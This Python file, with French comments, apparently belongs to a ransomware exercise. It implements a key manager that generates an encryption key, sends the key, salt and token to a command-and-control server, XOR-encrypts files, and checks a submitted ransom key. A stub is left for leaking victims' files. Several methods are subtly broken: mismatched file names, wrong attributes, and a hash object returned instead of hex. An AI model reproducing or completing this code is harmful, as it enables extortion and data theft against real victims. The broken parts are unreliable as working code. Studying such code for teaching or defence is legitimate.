from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Hacher le sel et la clé privée avec la fonction PBKDF2HMAC
        kdf = PBKDF2HMAC(
            algorithm = hashes.SHA256(),
            iterations = self.ITERATION,
            salt = salt,
            length = self.KEY_LENGTH)
        # Dériver la clé avec la "Key Derivation Function" obtenue
        key_derive = kdf.derive(key)
        # Retourner la clé dérivée
        return key_derive


    def create(self)->Tuple[bytes, bytes, bytes]:
        # Générer des nombres aléatoires "sécurisés" pour le sel
        salt = secrets.token_bytes(self.SALT_LENGTH)
        # Générer des nombres aléatoires "sécurisés" pour la clé
        key = secrets.token_bytes(self.KEY_LENGTH)
        # Créer un token à partir de la clef et du sel (+ d'une kdf)
        token = self.do_derivation(salt, key)
        # Retourner le sel, la clé et le token
        return key, salt, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        
        # Organiser les données à envoyer sous la forme demandée
        data = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
            }

        # Relever l'URL du CNC
        url_CNC = f"http://{self._remote_host_port}/new"
        # Envoyer les données au CNC en utilisant la méthode POST
        reponse = requests.post(url_CNC, json = data)

        # Vérifier qu'il n'y a pas d'erreur lors de la requête
        if reponse.status_code == 200:
            # Afficher le message de confirmation
            self._log.info(f"Les données ont été envoyées au CNC avec succès")
        # Prendre en compte le cas où il y a une erreur
        else:
            # Afficher le message d'erreur associé
            self._log.info(f"Erreur : {reponse.text}")

    def setup(self)->None:
        # Créer les éléments cryptographiques
        self._key, self._salt, self._token = self.create()
        # Créer un chemin pour sotcker les données
        os.makedirs(self._path, exist_ok=True)
        # Sauvegarder les données du token
        with open(os.path.join(self._path,'token.bin'),'wb') as f:
            f.write(self._token)
        # Sauvegarder les données du sel
        with open(os.path.join(self._path,'salt.bin'),'wb') as f:
            f.write(self._salt)
        # Envoyer les éléments cryptographiques au CNC
        self.post_new(self._salt,self._key,self._token)

    def load(self)->None:
        # Charger les données du sel
        with open('salt.txt', 'r') as f:
            self.salt = f.read().strip()
        # Charger les données du token
        with open('token.txt', 'r') as f:
            self.token = f.read().strip()

    def check_key(self, candidate_key:bytes)->bool:
        # calculating a token candidate based on the provided candidate key and self._salt
        token_to_check = self.do_derivation(self._salt, candidate_key)
        # Vérifier si le token est le bon
        token_true_false = (token_to_check == self._token)
        # Retourner un booléen
        return token_true_false

    def set_key(self, b64_key:str)->None:
        key_to_check = base64.b64decode(b64_key)

        if self.check_key(key_to_check):
            self._key = key_to_check
            self._log.info("Key successfully set")
        else:
            raise Exception('Invalid Key.')

    def get_hex_token(self)->str:
        # Hasher le token
        hashed_token = sha256()
        hashed_token.update(self._token)
        hashed_token.hexdigest
        return hashed_token

    def xorfiles(self, files:List[str])->None:
        self._encrypted_files = [xorfile(file, self._key) for file in files]

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
        self._salt = None
        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
        self._key = None
        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
        self._token = None
        self._log.info('Les données cryptographique ont été supprimées')